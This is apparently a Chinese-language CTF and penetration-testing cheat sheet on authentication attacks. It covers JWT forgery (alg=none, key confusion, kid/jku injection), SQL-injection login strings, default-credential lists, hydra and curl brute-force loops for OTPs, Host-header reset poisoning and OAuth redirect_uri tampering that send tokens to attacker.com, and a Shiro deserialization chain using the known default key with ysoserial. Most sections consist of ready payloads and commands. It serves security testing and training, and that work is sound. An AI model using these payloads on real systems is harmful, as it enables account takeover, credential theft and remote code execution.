# auth|认证与会话|🔐
## [g1] JWT——JWT 缺陷集中在签名算法、密钥与 Header 注入三处，是认证题最高频考点。
### [jwt-attacks] JWT 攻击全集 | medium | JWT;认证 | jwt绕过
> 从结构解码到签名伪造的 JWT 完整攻击面速查。
## 原理
```txt
JWT = Header.Payload.Signature 三段，Base64URL 编码（-/_ 替代 +/，无 = 填充）
Header:    {"alg":"HS256","typ":"JWT"}
Payload:   {"sub":"admin","role":"admin","exp":1699999999}
Signature: HS256 即 HMAC-SHA256(seg1.seg2, secret)；RS256 即 RSA 私钥签名
```
Header/Payload 仅编码不加密，任何人可解码，勿放敏感数据。

```bash
# base64url 解码还原
echo 'eyJhbGciOiJIUzI1NiJ9' | tr '_-' '/+' | base64 -d
# 在线工具: jwt.io / token.dev
```

## Payload 速查
| 字段 | 含义 | 攻击点 |
|---|---|---|
| alg | 签名算法 | alg=none / 密钥混淆 |
| sub / name | 用户标识 | 改他人身份 |
| role / admin / is_admin | 权限 | 直接提权 |
| exp | 过期时间 | 调大绕过 |
| jti | 唯一 ID | 防重放可绕 |

## 测试顺序
1. 解码看 alg 与字段
2. 试 alg=none（大小写变异全试）
3. 弱密钥爆破（hashcat -m 16500）
4. RS256 -> HS256 公钥混淆
5. kid / jku 注入
6. 篡改 exp / role 后重放

> [!tip] 拿到 token 第一步永远是解码看字段与算法，再定攻击路径。
### [jwt-alg-none] alg=none 与密钥混淆 | easy | JWT;认证 | alg none;rs256转hs256
> 免签名与 RS256->HS256 公钥混淆的标准手法与工具参数。
## 原理
- alg=none：服务端若信任该算法则完全跳过签名校验，Header.alg 改 none 并清空/删除 Signature 即可通过
- 大小写变异：none / None / NONE / nOnE 逐个尝试，部分实现按字符串匹配
- RS256 -> HS256：服务端用公钥验签；若接受 HS256 且不区分密钥类型，用 RSA 公钥内容作 HMAC secret 即可伪造

## Payload 速查
```python
# python PyJWT 伪造 alg=none
import jwt
tok = jwt.encode({'sub':'admin','role':'admin'}, key='', algorithm='none')
print(tok)
```
```bash
# jwt_tool 一键利用
jwt_tool <JWT> -X a        # alg=none 全大小写变异
jwt_tool <JWT> -X k -pk    # RSA 公钥当 HMAC 密钥混淆
# 从证书提取公钥
openssl x509 -in cert.pem -pubkey -noout > public.pem
```

## 绕过
- 部分库有算法白名单，报错信息会泄露候选算法
- 混淆攻击成功后，用同一公钥即可伪造任意用户
- Signature 留空串与直接删除两种形态都试，实现差异大
### [jwt-weak-key] 弱密钥爆破与 kid/jku 注入 | medium | JWT;认证 | hashcat jwt;kid注入
> hashcat/jwt_tool 爆破 HS256 弱密钥，以及 kid、jku、n 值注入伪造。
## 原理
- HS256 为对称密钥算法，爆破出 secret 即可任意伪造
- kid：Header 中的密钥 ID，实现常拼路径或查库，可注入路径穿越 / SQLi / 指定已知内容文件
- jku / jwks：服务端从 jku 指向的 URL 拉取公钥，可指向攻击者服务器
- n 值混淆：把 ECDSA 公钥的 n 组件塞入 RSA 公钥结构，校验不严时绕过

## Payload 速查
```bash
# hashcat JWT HS256 爆破（模式 16500）
hashcat -m 16500 -a 0 jwt.txt rockyou.txt
# jwt_tool 爆破与注入
jwt_tool <JWT> -C -d wordlist.txt              # 爆破 secret
jwt_tool <JWT> -X i -I kid -v /etc/passwd      # kid 注入文件路径
jwt_tool <JWT> -X j -ju http://attacker.com/jwks.json   # jku 指向攻击者
```
```sql
-- kid 注入 SQLi（服务端拼接查询时）
-- kid = ' UNION SELECT 'attacker-secret' -- -
-- 随后用 attacker-secret 做 HS256 签名
```

## 绕过
- kid 指向内容已知的文件（/dev/null、/proc/self/environ），其内容充当密钥
- 伪造 JWKS 需与目标同算法，先本地验签再打
- 爆破词表：rockyou 前段 + 常见 JWT 密钥（secret / jwt-secret / 123456）
## [g2] 登录绕过——登录绕过先走逻辑与配置，再上字典：从万能密码、前端校验到响应篡改。
### [login-bypass] 登录绕过速查 | easy | 登录;逻辑漏洞 | 万能密码
> 万能密码、前端校验绕过、响应篡改与接口直调的标准手法。
## 原理
登录校验分三层都可能出问题：前端校验可绕过、后端比对可注入/比错、响应渲染可篡改。先低成本逻辑层，再上字典与爆破。

## Payload 速查
```txt
万能密码（后端拼接 SQL 时生效）
' OR '1'='1
' OR 1=1 -- -
admin' --
' OR 'a'='a
1' OR '1'='1' -- '
' OR 1=1 #
```
```bash
# 前端校验绕过三连
# 1. F12 修改或跳过校验 JS 函数
# 2. Burp 拦截响应, success:false -> true
# 3. 不点登录, 直接抓业务请求改包重放
```

## 绕过
- 接口直调：登录成功后的后续接口（/api/profile /admin）可能无鉴权
- 响应篡改：data / msg / flag 驱动前端逻辑时直接改
- 用户枚举提示（用户不存在/密码错误）配合字典定向爆破

> [!warn] 万能密码只在后端直接拼接 SQL 时有效，先测语法报错特征再批量试。
### [weak-passwords] 弱口令与默认口令 | easy | 爆破;密码 | 弱口令;字典
> 登录爆破的字典优先级与常见系统默认口令速查。
## 原理
爆破成功率 = 字典命中率 x 限速绕过能力。先试默认口令与超弱口令，再上大字典；注意验证码、次数锁定、IP 限速。

## Payload 速查
```txt
弱口令优先级
admin/admin  admin/123456  admin/admin888
root/root  root/toor  test/test  guest/guest
admin/12345678  admin/123123  admin/666666
user/user  demo/demo  admin1/admin1
admin/Admin@123  admin/1qaz2wsx  admin/000000
```
```bash
# hydra http-post-form 爆破
hydra -l admin -P dict.txt 10.0.0.1 http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=error" -t 16
# wfuzz 双字典
wfuzz -z file,user.txt -z file,pass.txt -u http://t/login \
  -d "user=FUZZ&pass=FUZ2Z" --hc 401
```

## 默认口令速查
| 系统 | 默认口令 |
|---|---|
| Tomcat | tomcat/tomcat, admin/admin |
| MySQL | root/空 |
| Redis | 默认无鉴权 |
| Grafana | admin/admin |
| 宝塔 | 随机生成，可爆破 |
| 路由器/摄像头 | admin/admin, admin/1234 |
## [g3] 会话安全——会话缺陷 = 会话不可信：固定、可预测、未轮换、Cookie 可篡改。
### [session-fixation] 会话固定与可预测 SID | medium | 会话;Cookie | session fixation
> 会话固定攻击手法、可预测 SessionID 爆破与登录后未更新 SID。
## 原理
会话固定：攻击者先自建会话拿 SID，诱导受害者在同一 SID 下登录；登录后服务端若不轮换 SID，攻击者即可冒用。可预测 SessionID：ID 由时间/计数/用户名派生时可枚举。

## Payload 速查
```txt
会话固定三步
1. 访问目标, 记录自己的 SID
2. 通过 XSS/链接注入/子域 Cookie 让受害者带上该 SID
3. 受害者完成登录后, 攻击者用 SID 直接进入会话
```
```bash
# 登录前后对比 Set-Cookie 是否变化（轮换检测）
curl -i -c c1.txt http://t/login
# 登录后重放 c1.txt 中的 SID, 看是否仍有效
```

## 绕过
- 可预测 SID：抓一串找规律（MD5(时间)、自增、用户名拼接），脚本枚举逐个验证
- 合规标准：登录/提权后必须换新 SID 并使旧 SID 失效
- 检查 Cookie 属性：HttpOnly / Secure / SameSite 缺失放大利用面
### [cookie-tamper] Cookie 篡改与会话反序列化 | medium | 会话;反序列化 | cookie伪造
> 明文/可逆 Cookie 篡改与 PHP/Java 会话反序列化利用。
## 原理
- Cookie 明文或可逆编码（Base64 / URL 编码 / 异或）时可篡改 uid/role/admin 提权
- 会话对象序列化存储（PHP session、Java 对象 Cookie），反序列化触发危险类即 RCE
- PHP 数组中毒：篡改序列化数组的长度/键名注入对象

## Payload 速查
```txt
明文 Cookie 篡改
uid=1 -> uid=0
role=user -> role=admin
Base64: echo 'uid=1' | base64 后替换重放
序列化: O:4:"User":3:{...s:3:"uid";i:1;} 改 i:1 为 i:0
```
```bash
# 识别序列化 Cookie 特征
grep -oE 'O:[0-9]+:"[^"]+"' cookie.txt
# PHP session 文件: /tmp/sess_<SID>, 可配合 LFI 读取
```

## 绕过
- PHP 反序列化：注入 __wakeup/__destruct 对象，phpggc 生成 POP 链
- Java：JSESSIONID 只是索引，真正攻击面在反序列化接口（配 ysoserial）

> [!danger] 先确认语言与框架再选 gadget 链，依赖版本不匹配不触发还容易打崩环境。
## [g4] 验证码——验证码四道防线：可 OCR、可复用、可回显、前端假校验。
### [captcha-ocr] 验证码识别与复用 | easy | 验证码;OCR | 验证码复用
> 简单验证码 OCR、验证码复用、万能验证码与删除参数绕过。
## 原理
- 简单图形验证码可 OCR（tesseract / 打码平台 / 深度学习）
- 会话级验证码未消费时同一验证码可复用
- 万能码 / 空值 / 删除参数不校验的弱实现直接绕过

## Payload 速查
```bash
# tesseract 识别简单数字码
tesseract captcha.png out -psm 7 digits
# 复杂码上打码平台或本地 CNN 模型
```
```txt
复用测试
1. 抓登录包, 记录 code=XXXX
2. 换账号/换包重放, 验证码是否仍有效
3. 删除 code 参数 / 置空 / 固定 0000 重放
```

## 绕过
> [!tip] 先测「验证码是否真的参与服务端判定」: 删参数、固定值、复用旧码各一次, 多数弱实现直接可绕。
### [captcha-frontend] 前端验证码绕过 | easy | 验证码;前端 | 验证码回显
> 验证码仅前端校验、校验接口独立、答案回显在响应中的绕过。
## 原理
- 验证码生成/校验全在前端 JS，绕过前端直接调业务接口
- 校验接口与业务接口分离：先拿「校验通过」凭证再打业务接口
- 答案明文存 localStorage / cookie / 响应体

## Payload 速查
```txt
前端绕过
1. F12 找验证码生成函数, 直接调用获取答案
2. 校验接口响应 {"pass":true} 直接重放
3. 查 localStorage / sessionStorage / cookie 中的明文
4. 重写校验 JS 函数让结果恒真
```

## 绕过
- 图形码接口与业务接口同源时，先调图形接口拿 cookie 再带 cookie 发业务包
- 答案回显在响应 JSON / Set-Cookie / 图片文件名中直接读

> [!warn] 校验在前端或可回显时, 全程不需要真实识别图形, 别浪费时间 OCR。
### [sms-bruteforce] 短信/邮箱验证码爆破 | medium | 验证码;爆破 | 短信轰炸
> 四位验证码爆破、频率限制绕过与并发重放。
## 原理
短信/邮箱验证码通常 4-6 位纯数字，空间极小；核心难点是频率限制与失效时间。爆破关键是绕过限速与失效。

## Payload 速查
```bash
# 4 位验证码爆破（无次数限制时）
for i in $(seq 0 9999); do
  code=$(printf '%04d' $i)
  curl -s -X POST http://t/verify -d "phone=13800138000&code=$code" \
    | grep -q success && echo HIT:$code && break
done
```

## 绕过
- 频率限制绕过：X-Forwarded-For 换 IP、URL 加随机参数、大小写/空格变体、换接口
- 验证码不失效：跨会话/跨请求复用
- 获取验证码接口把码回显在响应、日志、邮件/短信正文中
- 并发提交同一验证码（竞态导致多次有效）

> [!warn] 爆破前确认次数上限, 防账号锁定或风控触发影响后续测试。
## [g5] 密码重置——密码重置是认证逻辑最高发漏洞区：任意用户重置、Host 头注入、token 可爆破。
### [reset-arbitrary] 任意用户重置 | medium | 密码重置;越权 | 任意重置
> 重置可指定任意用户、步骤可跳过、验证弱化导致任意账号接管。
## 原理
重置流程 = 身份验证 + 设置新密码。漏洞常在两处：身份验证可被跳过/弱化，或目标用户参数可控。

## Payload 速查
```txt
任意用户重置
1. 正常走重置流程, 抓包找用户标识: user / tel / uid / email
2. 篡改为目标: user=admin / tel=受害者手机号
3. 跳过验证步骤: 只调「设置新密码」接口
4. 直接 POST /reset_password, 不经过 /verify_code
```
```bash
# 越权直调重置接口
curl -X POST http://t/api/reset_pwd \
  -H 'Content-Type: application/json' \
  -d '{"user":"admin","newpass":"123456"}'
# 步骤跳级: step=1 改 step=3
curl -X POST http://t/forgot -d 'step=3&user=admin&newpass=123456'
```

## 绕过
- 验证方式降级：手机验证码 -> 邮箱 -> 安全问题, 选弱验证通道
- 新密码 / token 回显在响应 JSON 或日志中
### [reset-token] 重置 token 爆破与泄露 | medium | 密码重置;Token | 重置链接
> 重置链接 token 可预测/可爆破、过期机制缺陷与泄露面。
## 原理
重置链接 token 由时间戳/用户名/弱随机生成时可预测或爆破；token 过期机制缺失时可重复使用。

## Payload 速查
```txt
token 常见特征
- MD5(用户名) / MD5(时间戳)
- 时间戳 + 自增计数
- 4-6 位数字验证码 -> 直接爆破
- UUID v1 含时间信息, 可推算
```
```bash
# 拼接可预测 token (md5(admin))
curl -s http://t/reset?token=$(python3 -c 'import hashlib;print(hashlib.md5(b"admin").hexdigest())')
```

## 绕过
- token 泄露面：响应头 / Referer / 访问日志 / 调试接口
- 旧 token 未失效：已重置过的链接可重复使用
- 重置后新旧密码并存，原密码仍可登录
### [reset-hostheader] Host 头注入与接口越权 | medium | 密码重置;Host头 | host头注入
> Host 头注入制造重置链接、接口越权重置、密码修改逻辑缺陷。
## 原理
重置邮件链接域名取自 Host 等请求头时，改头即把链接指向攻击者域；受害者点开链接，重置 token 落入攻击者手里。

## Payload 速查
```bash
# Host 头注入
curl http://t/forgot -H 'Host: attacker.com' -d 'user=admin'
# 变体: X-Forwarded-Host / X-Real-Host / 绝对 URL 覆盖
curl http://t/forgot -H 'X-Forwarded-Host: attacker.com' -d 'user=admin'
```
```txt
改密逻辑缺陷
- POST /change_pwd 不带旧密码直接成功
- old_password 参数存在但不参与校验
- user 参数可控 -> 越权修改他人密码
- 改密后旧 token / 其他会话未失效
```

## 绕过
> [!danger] 拼链接的优先级因实现而异 (Host / X-Forwarded-Host / X-Real-Host), 逐个替换头测试。
## [g6] OAuth2 与 SSO——OAuth 四件套：redirect_uri、state、code、token 挨个验；SAML 断言签名优先。
### [oauth-redirect] OAuth redirect_uri 篡改 | medium | OAuth;SSO | oauth回调
> redirect_uri 校验缺陷导致授权码/令牌窃取与账号接管。
## 原理
OAuth 授权码流程：用户同意后浏览器带 code 跳转到 redirect_uri。redirect_uri 校验不严时，受害者授权后 code 落入攻击者，换取 token 即账号接管。

## Payload 速查
```bash
# redirect_uri 篡改变体
redirect_uri=https://attacker.com/cb
redirect_uri=https://t.com@attacker.com
redirect_uri=https://t.com.evil.com
redirect_uri=https://t.com/cb/../../attacker
redirect_uri=https://t.com/cb?redirect=https://attacker.com
```
```txt
收到 code 后换 token
POST /oauth/token  grant_type=authorization_code
code=<窃取的 code>  client_id=<应用 id>  client_secret=<泄露密钥>
```

## 绕过
- 白名单绕过：前缀匹配 / 包含匹配 / 子域宽松逐一测试
- implicit 模式：token 经 URL fragment 回传，中间页可拦截
- 先探错误提示，有时直接回显合法 redirect_uri 格式
### [oauth-state] state 缺失与会话固定 | medium | OAuth;SSO | oauth state
> state 缺失导致 CSRF 登录、token 泄露与开放重定向串联。
## 原理
state 用于绑定授权请求与回调；缺失时攻击者可诱导受害者完成授权后冒用 code（登录 CSRF / 会话固定类）。token 泄露在 URL 或日志中可被利用。

## Payload 速查
```txt
state 缺失利用
1. 攻击者构造无 state 的授权 URL 发给受害者
2. 受害者完成授权, code 回调到攻击者可控 redirect_uri
3. 攻击者用 code 登录受害者账号
```
```bash
# implicit 模式 token 在 fragment
# https://t/cb#access_token=xxxx
# 用 token 直接调 API
curl -H 'Authorization: Bearer xxxx' http://t/api/userinfo
```

## 绕过
- 检查点：state 有无、code 单次性（重放 code 是否报错）、token 有效期与 scope
- 开放重定向与 redirect_uri 宽松叠加可做完整钓鱼闭环

> [!tip] OAuth 测试走全链路: 授权 URL -> 同意页 -> 回调, 每段都抓包检查参数。
### [sso-saml] SAML 断言伪造 | hard | SSO;SAML | saml绕过
> SAML 断言伪造、XML 签名绕过与 SSO 常见错误配置。
## 原理
SAML 用 XML 断言承载身份，签名在 ds:Signature 元素。常见缺陷：不验签、签名元素未参与校验、XSW 签名包裹绕过、audience/recipient 不校验。

## Payload 速查
```txt
SAML 攻击面
1. 断言未签名: 直接改 NameID / Attributes 提权
2. 移除整个 Signature 节点绕过验签
3. XSW: 把合法签名塞进伪造断言的包裹结构
4. 跨 SP 复用: recipient / audience 未校验
5. 双重签名 / ID 引用替换
```
```bash
# SAMLResponse 是 base64 的 XML
echo '<base64>' | base64 -d > resp.xml
# 修改后重新 base64 编码提交
```

## 绕过
> [!warn] SAML 题先确认是否验签、签名元素是否参与校验, 再考虑 XSW / 包裹类绕过。
## [g7] 双因素绕过——2FA 只加一道门槛，绕过集中在旁路、枚举、重放与时间窗口。
### [2fa-bypass] 双因素绕过 | medium | 2FA;MFA | 2fa绕过
> 2FA 旁路直调、验证码枚举、重放与时间窗口利用。
## 原理
2FA 只是多一道门槛。绕过集中在旁路（受保护接口不校验 2FA 标志）、枚举（验证码可爆）、重放与时间窗口。

## Payload 速查
```txt
2FA 绕过四板斧
1. 旁路: 直接访问登录后的接口/页面, 不走 2FA
2. 枚举: 4-6 位验证码爆破（无次数限制时）
3. 篡改: 2fa=false / verified=true / skip=1 参数
4. 重放: 同一验证码包跨会话重放
```
```bash
# 响应篡改
{"success":false} -> {"success":true}
# 直接打受保护资源
curl -b 'session=xxx' http://t/dashboard
```

## 绕过
> [!tip] 先测「受保护接口是否真的检查 2FA」: 多数实现只在网关检查, 绕过网关即绕过 2FA。
### [otp-logic] OTP 校验逻辑缺陷 | medium | 2FA;OTP | otp绕过
> 绕过码、空值比较、竞态重放与时间窗口等 OTP 实现缺陷。
## 原理
OTP 校验端缺陷比算法端更常见：允许空/固定值、不校验时效、并发提交、校验接口无次数限制、竞态。

## Payload 速查
```txt
OTP 缺陷速查
1. 万能码: 000000 / 123456 / 0000 / 空值
2. code=0 / code=false 弱等值比较
3. 并发重放: 同一码多线程提交（竞态）
4. 时间窗口: 前后步长窗口内均有效
5. 校验状态未原子清理: 失败后仍可重放
```
```bash
# 并发提交同一验证码
for i in $(seq 1 50); do
  curl -s -X POST http://t/verify -d 'code=1234' &
done; wait
```

## 绕过
> [!tip] OTP 测试顺序: 空/固定值 -> 重放 -> 并发 -> 爆破, 成本从低到高。
## [g8] 认证逻辑总纲——认证全功能点 checklist + Shiro 特性速查，查漏神器。
### [auth-checklist] 认证功能点 Checklist | easy | 审计;Checklist | 认证清单
> 注册/登录/找回/改密/会话全功能点测试清单，覆盖认证审计。
## 功能点速查
| 功能 | 必测项 |
|---|---|
| 注册 | 角色/状态字段可控、用户名接管、邮箱未验证、批量注册 |
| 登录 | 万能密码、弱口令、用户枚举、响应篡改、SID 轮换 |
| 找回 | 任意用户、Host 头、token 可预测、验证码绕过、步骤跳级 |
| 改密 | 旧密码必填性、越权改他人、改后会话清理 |
| 2FA | 旁路、枚举、重放、开关参数 |
| 会话 | 固定、可预测、Cookie 篡改、超时、并发登录 |
| 越权 | 水平换 ID、垂直提权、接口直调 |

## 测试流程
```txt
1. 枚举全部认证接口（登录/注册/找回/改密/校验/上传）
2. 每个接口过: 参数篡改 / 缺失 / 越权 / 重放
3. 全流程走查: 状态机跳步、步骤颠倒
4. 会话侧: 登录前后对比 SID, 检查 Cookie 属性
5. 密码侧: 确认存储为明文 / MD5 / SHA1 (源码或泄露文件)
```

> [!danger] 先建「接口 + 参数 + 预期权限」矩阵再逐格打, 避免漏测盲区。
### [shiro] Shiro 特性速查 | hard | Shiro;反序列化 | shiro反序列化
> Apache Shiro 反序列化与默认配置的识别与利用。
## 原理
Shiro 用 rememberMe Cookie 存序列化对象，AES-CBC 加密，历史版本默认硬编码密钥。已知/弱密钥时可构造反序列化 payload 达成 RCE。特征：请求/响应带又长又密的 rememberMe Cookie。

## Payload 速查
```bash
# 识别 Shiro
curl -s -I http://t/ -H 'Cookie: rememberMe=1'
# 响应 Set-Cookie: rememberMe=deleteMe 即命中
```
```txt
经典利用链
1. 逐一试默认密钥库做 AES 加密
2. gadget: CommonsBeanutils1 / CommonsCollections*
3. java -jar ysoserial.jar CommonsBeanutils1 'cmd /c whoami' > p.bin
4. 加密后写入 rememberMe 触发反序列化
```

## 绕过
| 版本 | 特点 |
|---|---|
| 1.2.4 及更早 | AES-CBC + 默认密钥 kPH+bIxk5D2deZiIxcaaaA== |
| 1.4.2+ | 默认密钥被移除, 可爆破弱密钥 |
| 新版本 | 必须拿到/爆破密钥 |

> [!warn] 先确认目标 Java 版本与可用 gadget, 否则 payload 不触发且易打崩环境。
